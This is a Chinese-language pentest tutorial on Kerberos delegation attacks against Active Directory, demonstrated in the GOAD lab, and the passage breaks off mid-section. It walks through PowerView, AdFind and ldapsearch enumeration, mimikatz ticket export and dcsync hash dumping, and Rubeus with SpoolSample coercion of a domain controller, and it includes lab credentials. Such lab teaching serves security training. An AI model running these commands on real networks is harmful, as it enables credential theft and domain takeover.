---
title: 内网渗透(十一)：委派攻击
url: https://mp.weixin.qq.com/s/2KJymRifDnYBWDNr5HPPNA
source: Doonsec's feed
date: 2026-03-29
fetch_date: 2026-03-30T04:40:28.566067
---

# 内网渗透(十一)：委派攻击

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2v7clEl5e0h58g0JBe8mexziaEhGuCZKJz0nSW62lT42dgziazC1X2ZNHftBqWEJK7AhvEBsKjROBn7hLQ4gZYAU1OmSEjrc8DayvX8lia5xIg/0?wx_fmt=jpeg)

# 内网渗透(十一)：委派攻击

JJ1ng
JJ1ng

JJ1ng

![]()

在小说阅读器中沉浸阅读

# 0x00 简介

本章节主要介绍委派攻击相关的内容。个人才疏学浅，有未阐述清楚或遗漏的地方，可自行搜索相关资料参考学习。

主要内容：非约束性委派、约束性委派、基于资源的约束性委派以及 GOAD 靶场演示。

---

**委派**（Delegation）是域环境中的一种机制，允许某台服务器“代表用户”去访问其他服务。如下图所示，用户只能访问 Web 服务器，如想获取 File 服务器上的数据，只能委托 Web 服务器来实现，此时 Web 服务器就需要“模拟用户的身份”向 File 服务器发起请求——这种授权机制就是**委派**。

![](https://mmbiz.qpic.cn/mmbiz_png/2v7clEl5e0jv4oBRRKUyVhSdRL1s5cRfnNSvBxlITRhKPnvAw819crREibficfS1dsxuyh6nIKoC8EIlq0gibWicXcibyiaeQ1RTSa1WdJ8xma6JI/640?wx_fmt=png&from=appmsg)

## 1. 委派攻击

委派本身是合理的业务需求，一旦攻击者控制了拥有委派权限的主机或账户，就可通过滥用委托权限来窃取用户票据、伪造服务票据、修改委托配置等，从而实现权限提升及横向移动的效果，进而控制整个域内其他主机。委派攻击分为三类：

1. **非约束委派攻击**（Unconstrained Delegation，简称 UD）
2. **约束委派攻击**（Constrained Delegation**，**简称 CD）
3. **基于资源的约束委派攻击**（Resource Based Constrained Delegation，简称 RBCD）

## 2. 委派属性

域环境下，只有**机器账户**和**服务账户**才具有委派的属性，如能诱导用户在该机器或服务进行认证，攻击者就能从内存中提取票据，进而进行 PTT 攻击。

* **基于主机的委派 (Computer-based)**：权限直接赋予给**机器账户**，表示该主机上运行的所有具备特定权限的服务，都可以代表用户去访问后端资源
* **基于服务账户的委派 (Service Account-based)**：权限赋予给一个特定的**服务账户**，只有当服务以此特定账户身份运行时，才能触发委派机制，但如设置了“敏感账户，不能被委派”，则该账户无法进行委派

## 3. 工具推荐

https://github.com/fortra/impacket

https://www.joeware.net/freetools/tools/adfind/

https://github.com/leechristensen/SpoolSample

https://github.com/p0dalirius/Coercer

https://github.com/gentilkiwi/kekeo

https://github.com/GhostPack/Rubeus

# 0x01 非约束性委派

---

如果服务 A 配置了**非约束性委派**，那么当用户需委派服务 A 去请求服务 B 时，会将自己的 TGT 发给服务 A，且服务 A 会缓存到本地，并以此来模拟用户的身份向服务 B 发起请求。而如果域管访问配有“非约束性委派”的主机或服务时，就会在该主机上缓存域管的 TGT。如此，在接管该主机的情况下，可通过导出该主机内存中的票据，以此来获取域管的 TGT。

上述情况需域管主动访问，更合理高效的方式是通过漏洞（如：MS-RPRN 滥用（printerbug）、MS-EFSR 滥用（petitpotam）、MS-FSRVP 滥用（shadowcoerce）、PrivExchange 等）来强制域控向指定主机发起认证（可通过工具 Coercer 自动化探测）。

具体的认证流程可参考下图和下述链接，这里不做过多叙述。如下：

https://swisskyrepo.github.io/InternalAllTheThings/active-directory/kerberos-delegation-unconstrained/

https://book.hacktricks.wiki/zh/windows-hardening/active-directory-methodology/unconstrained-delegation.html

https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a?redirectedfrom=MSDN

![](https://mmbiz.qpic.cn/mmbiz_png/2v7clEl5e0j8TcibpIYCWeTFP1jictrcRGDiaJAFG0Pia0EbaDlR1iaT6YAviamibosZdXN0F1pySHV9vGzBOpibTsZ2YictfZ0utn16CicsdEr0nPn4Y/640?wx_fmt=png&from=appmsg)

## 1. UD 的查询

非约束性委派攻击的第一步，需要找到域内**非约束性委派**的机器账户和服务账户（域控默认配置了非约束性委派，如果都能接管域控，还搞个毛的其他主机）。注：如下域名都以 `north.sevenkingdoms.local` 为示例。

```
# 查询指定域内配置 UD 的主机
Import-Module .\PowerView.ps1; Get-NetComputer -Unconstrained -Domain north.sevenkingdoms.local | select name

Import-Module .\PowerView.ps1; Get-DomainComputer -Unconstrained -Properties Name,dnshostname,useraccountcontrol

Import-Module .\PowerView.ps1; Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION -Domain north.sevenkingdoms.local | select name

Import-Module .\powerview.ps1; Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Domain north.sevenkingdoms.local | select name

# 查询指定域内配置 UD 的服务账户
Import-Module .\PowerView.ps1; Get-DomainUser -UACFilter TRUSTED_FOR_DELEGATION -Domain north.sevenkingdoms.local | select name

Import-Module .\PowerView.ps1; Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Domain north.sevenkingdoms.local | select name
```

使用 Adfind 进行查找。

```
# 查询指定域内配置 UD 的主机
AdFind.exe -b "DC=north,DC=sevenkingdoms,DC=local" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
# 排除域控
AdFind.exe -b "DC=north,DC=sevenkingdoms,DC=local" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" dn

# 查询指定域内配置 UD 的服务账户
AdFind.exe -b "DC=north,DC=sevenkingdoms,DC=local" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
# 排除域控
AdFind.exe -b "DC=north,DC=sevenkingdoms,DC=local" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" dn

# 查询配置 UD 的主机和服务账户，并排除域控
AdFind.exe -b "DC=north,DC=sevenkingdoms,DC=local" -f "(&(|(samAccountType=805306368)(samAccountType=805306369))(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" dn
```

使用 ldapsearch 查询，可从域外进行查询，但需要域用户的凭证。

```
# 查询指定域内配置 UD 的主机
ldapsearch -x -H ldap://192.168.56.11:389 -D "jon.snow@north.sevenkingdoms.local" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep dn

# 查询指定域内配置 UD 的服务账户
ldapsearch -x -H ldap://192.168.56.11:389 -D "jon.snow@north.sevenkingdoms.local" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep dn
```

## 2. UD 的利用

对于非约束性委派的利用，理想情况是域管主动访问存在非约束性委派的机器账户，并通过 `dcsync` 来导出域控的 Hash。

```
# 导出票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# 导入票据
mimikatz.exe "kerberos::ptt xxx.kirbi" "exit"

# 查看票据
mimikatz.exe "kerberos::list" "exit"

# 通过 dcsync 导出域控所有 Hash
mimikatz.exe "lsadump::dcsync /domain:DOMAIN /all /csv" exit
```

但守株待兔的方式不可取，一种更为实用的办法是结合一些能强制发起认证的漏洞，让域管在不知情的情况下向配置非约束性委派的主机发起认证，从而获取到域管的 TGT。

```
# 工具 Rubeus，每隔一秒监听来自 winterfell 主机的票据
Rubeus.exe monitor /interval:1 /filteruser:winterfell$ /nowrap

# 结合打印机漏洞，强制域控 winterfell 回连 Win10
SpoolSample.exe winterfell win10

# 将 Rubeus 接收来自 winterfell 的 TGT 导入内存
Rubeus.exe ptt /ticket:BASE64

# 通过 dcsync 导出域内所有用户的 hash
mimikatz.exe "lsadump::dcsync /domain:DOMAIN /all /csv""exit"

（Delete below）
# 在将 TGT 导入内存后，也可使用 Mimikatz 直接导出内存中的票据，在通过 dcsync 导出所有 Hash
mimikatz.exe "privilege::debug""sekurlsa::tickets /export""exit"
mimikatz.exe "kerberos::ptt xxx-Administrator@krbtgt-DOMAIN.kirbi""exit"
mimikatz.exe "lsadump::dcsync /domain:DOMAIN /all /csv""exit"
```

# 0x02 约束性委派

---

相比 UD，**约束性委派**限制了能访问的目标服务范围，如果服务 A 配置约束性委派，那么只能委派访问指定范围内的其他服务。原理和 UD 相似，不同的是 UD 会直接转发 TGT ，而约束性委派则是利用 Kerberos 的扩展协议 S4U2self 和 S4U2proxy 来完成委派，其中就是通过 S4U2proxy 协议来限制委派服务的范围。

* **S4U2self**（Service for User to Self），允许服务代表用户向 KDC 申请访问该服务自身的 ST 票据
* **S4U2proxy**（Service for User to Proxy），允许服务 A 凭借可转发的 ST 票据，代表用户向 KDC 申请访问指定服务 B 的 ST 票据

具体的认证流程可参考下图和下述链接，这里不做过多叙述。如下：

https://swisskyrepo.github.io/InternalAllTheThings/active-directory/kerberos-delegation-constrained/

https://book.hacktricks.wiki/zh/windows-hardening/active-directory-methodology/constrained-delegation.html

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2v7clEl5e0iatA94JAkffH7bR862EqH5sYXFFyDLUFqiaGBKPEfPy15oRqialwebIhQibdtibvfOI3KxvD9L5JFiauPzkiaoAkgt0xF1Zga6QjhRbk/640?wx_fmt=png&from=appmsg)

在配置约束性委派时有两种模式，其核心区在于是否允许**协议转换**，具体如下：

* **Use Kerberos only**（仅使用 Kerberos），要求用户必须通过 Kerberos 认证，服务 A 也必须拿到用户可转发的 ST 票据，才能进行后续的委派和利用
* **Use any authentication protocol**（使用任何身份验证协议），不强制要求用户通过 Kerberos 认证，即拥有服务 A 的权限，则可利用 S4U2Self 扩展伪造任意用户向 KDC 申请访问自身的票据，然后通过 S4U2Proxy 转换为访问指定服务的票据

![](https://mmbiz.qpic.cn/mmbiz_png/2v7clEl5e0hDpdW2nibRSFfJW8AXWTEeDTM729iamNLLgEHmnP87w44N5MAOicEW2OEvW2lRkWvHCywAg4Ja7XQ87iaZmCuULazl0pWTt9gia5Bs/640?wx_fmt=png&from=appmsg)

## 1. CD 的查询

约束性委派攻击的第一步，也是要找到域内**约束性委派**的机器账户和服务账户。注：如下域名以 `north.sevenkingdoms.local`，账户以 `jon.snow/iknownothing` 为例。

```
# 查询指定域内配置 CD 的主机
Import-Module .\PowerView.ps1; Get-DomainComputer -TrustedToAuth -Domain north.sevenkingdoms.local | select userprincipalname, name, msds-allowedtodelegateto

Import-Module .\PowerView.ps1; Get-DomainComputer -TrustedToAuth -Domain north.sevenkingdoms.local -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto | ft -Wrap -AutoSize

# 查询指定域内配置 CD 的服务账户
Import-Module .\PowerView.ps1; Get-DomainUser -TrustedToAuth -Domain north.sevenkingdoms.local | select userprincipalname, name, msds-allowedtodelegateto

Import-Module .\PowerView.ps1; Get-DomainUser -TrustedToAuth -Domain north.sevenki...